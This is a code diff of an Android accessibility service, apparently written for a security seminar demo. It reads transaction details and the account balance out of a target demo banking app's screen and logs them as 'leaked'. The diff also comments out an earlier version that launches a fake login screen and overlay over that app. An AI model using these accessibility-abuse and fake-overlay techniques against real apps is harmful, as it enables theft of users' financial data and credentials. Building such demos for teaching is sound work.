@@ -16,44 +16,100 @@ import com.example.fakeapp.databinding.OverlayLayoutBinding
 import android.os.Handler
 import android.os.Looper
 
-//
-//class LoggerAccessibilityService : AccessibilityService() {
-//    companion object {
-//        private const val TAG = "AccessibilityLogger"
-//    }
-//
-//    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-//        if (event == null) return
-//
-//        Log.d(TAG, "======================")
-//        Log.d(TAG, "Package: ${event.packageName}")
-//        Log.d(TAG, "Class: ${event.className}")
-//        Log.d(TAG, "Type: ${AccessibilityEvent.eventTypeToString(event.eventType)}")
-//
+
+class LoggerAccessibilityService : AccessibilityService() {
+    companion object {
+        private const val TAG = "AccessibilityLogger"
+        private const val TARGET_PACKAGE = "com.example.cs426_seminar_app"
+    }
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null) return
+
+        val pkg = event.packageName?.toString() ?: return
+        if (pkg == packageName) return
+
+        Log.d(TAG, "======================")
+        Log.d(TAG, "Package: ${event.packageName}")
+        Log.d(TAG, "Class: ${event.className}")
+        Log.d(TAG, "Type: ${AccessibilityEvent.eventTypeToString(event.eventType)}")
+
 //        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
 //
 //            val root = rootInActiveWindow
 //
 //            Log.d(TAG, "========= UI TREE =========")
 //
-//            dumpNode(root)
+////            dumpNode(root)
 //        }
-//    }
-//
-//    override fun onInterrupt() {
-//        Log.d(TAG, "Interrupt")
-//    }
-//
-//    override fun onServiceConnected() {
-//        super.onServiceConnected()
-//        Log.d(TAG, "Accessibility Service Connected")
-//    }
-//
-//    override fun onCreate() {
-//        super.onCreate()
-//        Log.d(TAG, "Service Created")
-//    }
-//
+
+        if (pkg == TARGET_PACKAGE &&
+            (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
+                    event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED)
+        ) {
+            leakTransactions()
+        }
+
+    }
+
+    private fun leakTransactions() {
+        val root = rootInActiveWindow ?: return
+
+        val typeNodes = root.findAccessibilityNodeInfosByViewId(
+            "$TARGET_PACKAGE:id/txtTransactionType"
+        )
+
+        if (typeNodes.isEmpty()) {
+            // UI có thể chưa kịp render data, thử lại sau 1 nhịp
+            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
+                leakTransactionsInternal()
+            }, 300)
+            return
+        }
+
+        leakTransactionsInternal()
+    }
+
+    private fun leakTransactionsInternal() {
+        val root = rootInActiveWindow ?: return
+
+        Log.d(TAG, "===== LEAKED TRANSACTIONS =====")
+
+        val typeNodes = root.findAccessibilityNodeInfosByViewId("$TARGET_PACKAGE:id/txtTransactionType")
+        val dateNodes = root.findAccessibilityNodeInfosByViewId("$TARGET_PACKAGE:id/txtTransactionDate")
+        val amountNodes = root.findAccessibilityNodeInfosByViewId("$TARGET_PACKAGE:id/txtTransactionAmount")
+
+        val count = minOf(typeNodes.size, dateNodes.size, amountNodes.size)
+        for (i in 0 until count) {
+            val type = typeNodes.getOrNull(i)?.text ?: "?"
+            val date = dateNodes.getOrNull(i)?.text ?: "?"
+            val amount = amountNodes.getOrNull(i)?.text ?: "?"
+            Log.d(TAG, "[$i] $type | $date | $amount")
+        }
+
+        val balanceNodes = root.findAccessibilityNodeInfosByViewId("$TARGET_PACKAGE:id/txtBalance")
+        balanceNodes.firstOrNull()?.text?.let {
+            Log.d(TAG, "Current Balance leaked: $it")
+        }
+
+        Log.d(TAG, "================================")
+    }
+
+
+    override fun onInterrupt() {
+        Log.d(TAG, "Interrupt")
+    }
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        Log.d(TAG, "Accessibility Service Connected")
+    }
+
+    override fun onCreate() {
+        super.onCreate()
+        Log.d(TAG, "Service Created")
+    }
+
 //    private fun dumpNode(node: AccessibilityNodeInfo?, depth: Int = 0) {
 //        if (node == null) return
 //
@@ -66,7 +122,7 @@ import android.os.Looper
 //            TAG,
 //            indent + nodeSummary(node)
 //        )
-//
+
 //        for (i in 0 until node.childCount) {
 //            dumpNode(node.getChild(i), depth + 1)
 //        }
@@ -92,133 +148,133 @@ import android.os.Looper
 //                append(" | editable")
 //        }
 //    }
-//
-//    override fun onDestroy() {
-//        super.onDestroy()
-//        Log.d(TAG, "Service Destroyed")
-//    }
-//
-//    override fun onUnbind(intent: Intent?): Boolean {
-//        Log.d(TAG, "Service Unbound")
-//        return super.onUnbind(intent)
-//    }
-//}
-
-class LoggerAccessibilityService : AccessibilityService() {
-
-    private lateinit var windowManager: WindowManager
-    private lateinit var overlayView: View
-    private lateinit var params: WindowManager.LayoutParams
-    private var fakeLoginShowing = false
-    private var screenHeight = 0
-    private var overlayShowing = false
-
-    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-
-        if (event == null) return
-
-        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
-            return
-
-        val pkg = event.packageName?.toString() ?: return
-
-        Log.d("ACCESSIBILITY", pkg)
-
-        // Bỏ qua event của chính app
-        if (pkg == packageName) return
-
-        if (pkg == "com.example.cs426_seminar_app") {
-
-            openFakeLogin()
-        }
-    }
-
-    private fun openFakeLogin(){
-        if(fakeLoginShowing)
-            return
-
-
-        fakeLoginShowing = true
-        val intent = Intent(
-            this,
-            FakeLoginActivity::class.java
-        )
-
-        intent.addFlags(
-            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or  Intent.FLAG_ACTIVITY_CLEAR_TOP
-        )
-
-        startActivity(intent)
-        
-    }
-
-    override fun onServiceConnected() {
-        super.onServiceConnected()
-
-        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
-
-        screenHeight = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
-            windowManager.currentWindowMetrics.bounds.height()
-        } else {
-            @Suppress("DEPRECATION")
-            val metrics = android.util.DisplayMetrics()
-            windowManager.defaultDisplay.getRealMetrics(metrics)
-            metrics.heightPixels
-        }
-
-        val binding = OverlayLayoutBinding.inflate(LayoutInflater.from(this))
-        overlayView = binding.root
-
-        binding.btnLogin.setOnClickListener {
-            Log.d("LOGIN", "LOGIN BUTTON")
-            // fake warning
-            binding.tvError.visibility = View.VISIBLE
-
-            // hide overlay after 2 secs
-            Handler(Looper.getMainLooper()).postDelayed({
-                hideOverlay()
-                binding.tvError.visibility = View.INVISIBLE
-            }, 2000)
-        }
-
-        params = WindowManager.LayoutParams(
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.MATCH_PARENT,
-            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
-            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
-            PixelFormat.TRANSLUCENT
-        )
-        params.gravity = Gravity.TOP or Gravity.START
-    }
-
-    private fun showOverlay() {
-
-        if (overlayShowing) return
-
-        windowManager.addView(overlayView, params)
-
-        overlayShowing = true
-
-        Log.d("Overlay", "SHOW")
-    }
-
-    private fun hideOverlay() {
-        if (!overlayShowing) return
-        windowManager.removeView(overlayView)
-        overlayShowing = false
-        Log.d("Overlay", "HIDE")
-    }
 
     override fun onDestroy() {
-        if (overlayShowing) {
-            windowManager.removeView(overlayView)
-        }
         super.onDestroy()
+        Log.d(TAG, "Service Destroyed")
     }
-    override fun onInterrupt() {
 
+    override fun onUnbind(intent: Intent?): Boolean {
+        Log.d(TAG, "Service Unbound")
+        return super.onUnbind(intent)
     }
 }
 
-
+//class LoggerAccessibilityService : AccessibilityService() {
+//
+//    private lateinit var windowManager: WindowManager
+//    private lateinit var overlayView: View
+//    private lateinit var params: WindowManager.LayoutParams
+//    private var fakeLoginShowing = false
+//    private var screenHeight = 0
+//    private var overlayShowing = false
+//
+//    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+//
+//        if (event == null) return
+//
+//        if (event.eventType != AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED)
+//            return
+//
+//        val pkg = event.packageName?.toString() ?: return
+//
+//        Log.d("ACCESSIBILITY", pkg)
+//
+//        // Bỏ qua event của chính app
+//        if (pkg == packageName) return
+//
+//        if (pkg == "com.example.cs426_seminar_app") {
+//
+//            openFakeLogin()
+//        }
+//    }
+//
+//    private fun openFakeLogin(){
+//        if(fakeLoginShowing)
+//            return
+//
+//
+//        fakeLoginShowing = true
+//        val intent = Intent(
+//            this,
+//            FakeLoginActivity::class.java
+//        )
+//
+//        intent.addFlags(
+//            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION or  Intent.FLAG_ACTIVITY_CLEAR_TOP
+//        )
+//
+//        startActivity(intent)
+//
+//    }
+//
+//    override fun onServiceConnected() {
+//        super.onServiceConnected()
+//
+//        windowManager = getSystemService(WINDOW_SERVICE) as WindowManager
+//
+//        screenHeight = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
+//            windowManager.currentWindowMetrics.bounds.height()
+//        } else {
+//            @Suppress("DEPRECATION")
+//            val metrics = android.util.DisplayMetrics()
+//            windowManager.defaultDisplay.getRealMetrics(metrics)
+//            metrics.heightPixels
+//        }
+//
+//        val binding = OverlayLayoutBinding.inflate(LayoutInflater.from(this))
+//        overlayView = binding.root
+//
+//        binding.btnLogin.setOnClickListener {
+//            Log.d("LOGIN", "LOGIN BUTTON")
+//            // fake warning
+//            binding.tvError.visibility = View.VISIBLE
+//
+//            // hide overlay after 2 secs
+//            Handler(Looper.getMainLooper()).postDelayed({
+//                hideOverlay()
+//                binding.tvError.visibility = View.INVISIBLE
+//            }, 2000)
+//        }
+//
+//        params = WindowManager.LayoutParams(
+//            WindowManager.LayoutParams.MATCH_PARENT,
+//            WindowManager.LayoutParams.MATCH_PARENT,
+//            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
+//            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+//                    WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
+//            PixelFormat.TRANSLUCENT
+//        )
+//        params.gravity = Gravity.TOP or Gravity.START
+//    }
+//
+//    private fun showOverlay() {
+//
+//        if (overlayShowing) return
+//
+//        windowManager.addView(overlayView, params)
+//
+//        overlayShowing = true
+//
+//        Log.d("Overlay", "SHOW")
+//    }
+//
+//    private fun hideOverlay() {
+//        if (!overlayShowing) return
+//        windowManager.removeView(overlayView)
+//        overlayShowing = false
+//        Log.d("Overlay", "HIDE")
+//    }
+//
+//    override fun onDestroy() {
+//        if (overlayShowing) {
+//            windowManager.removeView(overlayView)
+//        }
+//        super.onDestroy()
+//    }
+//    override fun onInterrupt() {
+//
+//    }
+//}
+//
+//
